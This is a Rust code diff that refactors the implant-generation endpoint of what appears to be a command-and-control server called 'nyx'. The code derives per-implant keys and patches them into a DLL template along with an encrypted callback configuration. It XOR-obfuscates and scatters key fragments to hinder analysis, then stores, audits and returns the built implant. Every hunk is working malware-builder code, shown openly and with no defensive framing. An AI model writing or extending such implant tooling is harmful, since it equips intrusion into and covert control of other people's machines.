@@ -715,6 +715,23 @@ fn check_rate_bucket(
 /// Generate per-implant secrets: key_seed, auth_token, config_nonce,
 /// implant keypair (X25519 with clamping), and config encryption key.
 fn generate_implant_keys(server_pub: [u8; 32]) -> Result<ImplantKeyMaterial, (StatusCode, String)> {
+    let (key_seed, auth_token, config_nonce) = generate_random_secrets();
+    let (implant_priv, implant_pub) = derive_implant_keypair(&key_seed, &server_pub)?;
+    let config_key = derive_implant_config_key(&implant_priv, &server_pub)?;
+
+    Ok((
+        implant_priv,
+        implant_pub,
+        config_key,
+        key_seed,
+        auth_token,
+        config_nonce,
+    ))
+}
+
+/// Fill the per-implant random secrets (key_seed, auth_token, config_nonce)
+/// from OsRng.
+fn generate_random_secrets() -> ([u8; 32], [u8; 32], [u8; 12]) {
     // key_seed: 32 random bytes, NEVER stored directly. Split into 4
     //              fragments, XOR-obfuscated, and scattered across .nyx_cfg.
     //    auth_token: one-time first-check-in token (stored in encrypted config).
@@ -726,12 +743,21 @@ fn generate_implant_keys(server_pub: [u8; 32]) -> Result<ImplantKeyMaterial, (St
     rand::rngs::OsRng.fill_bytes(&mut auth_token);
     rand::rngs::OsRng.fill_bytes(&mut config_nonce);
 
+    (key_seed, auth_token, config_nonce)
+}
+
+/// Derive the implant X25519 keypair: HKDF-SHA256 the key_seed with clamping,
+/// then derive the public key from the clamped scalar.
+fn derive_implant_keypair(
+    key_seed: &[u8; 32],
+    server_pub: &[u8; 32],
+) -> Result<([u8; 32], [u8; 32]), (StatusCode, String)> {
     // Derive implant_priv from key_seed via HKDF-SHA256 with X25519 clamping.
     let mut implant_priv_derived = [0u8; 32];
     nyx_protocol::crypto::hkdf_sha256(
-        &key_seed,
+        key_seed,
         b"nyx-implant-key-v1",
-        &server_pub,
+        server_pub,
         &mut implant_priv_derived,
     )
     .map_err(|e| {
@@ -759,23 +785,22 @@ fn generate_implant_keys(server_pub: [u8; 32]) -> Result<ImplantKeyMaterial, (St
         )
     })?;
 
+    Ok((implant_priv, implant_pub))
+}
+
+/// Derive the config encryption key via ECDH(implant_priv, server_pub) + HKDF.
+fn derive_implant_config_key(
+    implant_priv: &[u8; 32],
+    server_pub: &[u8; 32],
+) -> Result<[u8; 32], (StatusCode, String)> {
     // Derive config_key via ECDH(implant_priv, server_pub) + HKDF, matching
     // the implant's derive_config_key exactly.
-    let config_key = derive_config_key_server(&implant_priv, &server_pub).ok_or_else(|| {
+    derive_config_key_server(implant_priv, server_pub).ok_or_else(|| {
         (
             StatusCode::INTERNAL_SERVER_ERROR,
             "failed to derive config encryption key".into(),
         )
-    })?;
-
-    Ok((
-        implant_priv,
-        implant_pub,
-        config_key,
-        key_seed,
-        auth_token,
-        config_nonce,
-    ))
+    })
 }
 
 /// Build the per-implant config plaintext in wire format.
@@ -877,6 +902,27 @@ fn patch_implant_template(
         ));
     }
 
+    let placeholder_offset = locate_nyx_cfg_placeholder(binary)?;
+
+    // 4c. Write the patched section.
+    let section = &mut binary[placeholder_offset..placeholder_offset + 1024];
+    write_nyx_cfg_section(
+        section,
+        req,
+        implant_priv,
+        server_pub,
+        config_nonce,
+        ct_with_tag,
+    );
+
+    revalidate_patched_implant(binary, placeholder_offset)?;
+
+    Ok(())
+}
+
+/// Re-locate the .nyx_cfg placeholder in the pristine template and verify the
+/// full 1024-byte section fits inside the binary.
+fn locate_nyx_cfg_placeholder(binary: &[u8]) -> Result<usize, (StatusCode, String)> {
     // Re-locate the .nyx_cfg placeholder in the pristine template.
     let placeholder_offset = binary
         .windows(8)
@@ -900,9 +946,20 @@ fn patch_implant_template(
             "DLL template .nyx_cfg placeholder extends past EOF".into(),
         ));
     }
+    Ok(placeholder_offset)
+}
 
-    // 4c. Write the patched section.
-    let section = &mut binary[placeholder_offset..placeholder_offset + 1024];
+/// Write the patched 1024-byte .nyx_cfg section (header, masked key material,
+/// encrypted config) into `section`.
+fn write_nyx_cfg_section(
+    section: &mut [u8],
+    req: &GenerateRequest,
+    implant_priv: [u8; 32],
+    server_pub: [u8; 32],
+    config_nonce: [u8; 12],
+    ct_with_tag: &[u8],
+) {
+    let data_len = ct_with_tag.len();
 
     // Section layout:
     // [0xDEADBEEF magic 4B] [keying_levels u32 LE 4B] [data_len u16 LE 2B]
@@ -943,7 +1000,13 @@ fn patch_implant_template(
     for b in &mut section[86 + data_len..] {
         *b = 0;
     }
+}
 
+/// Re-validate the patched PE before computing SHA-256 and storing.
+fn revalidate_patched_implant(
+    binary: &[u8],
+    placeholder_offset: usize,
+) -> Result<(), (StatusCode, String)> {
     // Validate the patched PE before computing SHA-256 and storing. Catches a
     // malformed implant (bad magic, section overflow) at generation time rather
     // than letting the operator download a corrupted binary.
@@ -970,15 +1033,54 @@ fn store_and_audit_implant(
     auth_token: [u8; 32],
 ) -> Result<Json<GenerateResponse>, (StatusCode, String)> {
     // 5. Compute SHA-256 of the output.
+    let (sha256, token_hash) = compute_implant_hashes(binary, auth_token);
+
+    // 6. Store implant metadata.
+    let record = build_implant_record(op, req, binary, implant_pub, token_hash, &sha256)?;
+
+    let id = implant_store.insert(&record).map_err(|e| {
+        (
+            StatusCode::INTERNAL_SERVER_ERROR,
+            format!("failed to store implant record: {e}"),
+        )
+    })?;
+
+    // 7. Audit the generation event.
+    audit_and_log_generation(st, op, req, id, implant_pub, &sha256, binary.len());
+
+    Ok(build_generate_response(
+        req,
+        id,
+        implant_pub,
+        sha256,
+        binary,
+    ))
+}
+
+/// Compute the SHA-256 of the output binary and the SHA-256 of the one-time
+/// auth token (only the token hash is stored).
+fn compute_implant_hashes(binary: &[u8], auth_token: [u8; 32]) -> (String, String) {
     let mut hasher = Sha256::new();
     hasher.update(binary);
     let sha256 = hex::encode(hasher.finalize());
 
-    // 6. Store implant metadata.
     let mut token_hasher = Sha256::new();
     token_hasher.update(auth_token);
     let token_hash = hex::encode(token_hasher.finalize());
 
+    (sha256, token_hash)
+}
+
+/// Build the `ImplantRecord` for the store, failing closed on a pre-epoch or
+/// skewed system clock.
+fn build_implant_record(
+    op: &OperatorIdentity,
+    req: &GenerateRequest,
+    binary: &[u8],
+    implant_pub: [u8; 32],
+    token_hash: String,
+    sha256: &str,
+) -> Result<nyx_store::ImplantRecord, (StatusCode, String)> {
     // Clock: fail CLOSED on a pre-epoch / skewed clock. A `created_at = "0"`
     // (the previous `unwrap_or_else(|_| "0")` fallback) is a silent lie — it
     // makes a freshly generated implant look 55+ years old and breaks any
@@ -996,7 +1098,7 @@ fn store_and_audit_implant(
             ));
         }
     };
-    let record = nyx_store::ImplantRecord {
+    Ok(nyx_store::ImplantRecord {
         id: 0, // auto-incremented
         implant_pub: hex::encode(implant_pub),
         auth_token_hash: token_hash,
@@ -1013,20 +1115,23 @@ fn store_and_audit_implant(
         format: req.format.clone(),
         features_bitmap: req.features,
         keying_levels: req.keying,
-        sha256: sha256.clone(),
+        sha256: sha256.to_string(),
         size_bytes: binary.len() as i64,
         revoked: false,
         notes: req.notes.clone(),
-    };
+    })
+}
 
-    let id = implant_store.insert(&record).map_err(|e| {
-        (
-            StatusCode::INTERNAL_SERVER_ERROR,
-            format!("failed to store implant record: {e}"),
-        )
-    })?;
-
-    // 7. Audit the generation event.
+/// Append the `implant_generated` audit event and emit the tracing log line.
+fn audit_and_log_generation(
+    st: &AppState,
+    op: &OperatorIdentity,
+    req: &GenerateRequest,
+    id: i64,
+    implant_pub: [u8; 32],
+    sha256: &str,
+    size: usize,
+) {
     if let Some(audit) = &st.audit {
         let detail = serde_json::json!({
             "implant_id": id,
@@ -1044,11 +1149,21 @@ fn store_and_audit_implant(
         implant_pub = %hex::encode(implant_pub),
         callback = %req.callback,
         format = %req.format,
-        size = binary.len(),
+        size = size,
         "implant generated"
     );
+}
 
-    Ok(Json(GenerateResponse {
+/// Build the JSON response, including the base64 binary when the operator
+/// requested inline delivery.
+fn build_generate_response(
+    req: &GenerateRequest,
+    id: i64,
+    implant_pub: [u8; 32],
+    sha256: String,
+    binary: &[u8],
+) -> Json<GenerateResponse> {
+    Json(GenerateResponse {
         ok: true,
         implant_pub: hex::encode(implant_pub),
         sha256,
@@ -1065,7 +1180,7 @@ fn store_and_audit_implant(
         } else {
             None
         },
-    }))
+    })
 }
 
 /// `POST /api/generate-implant`
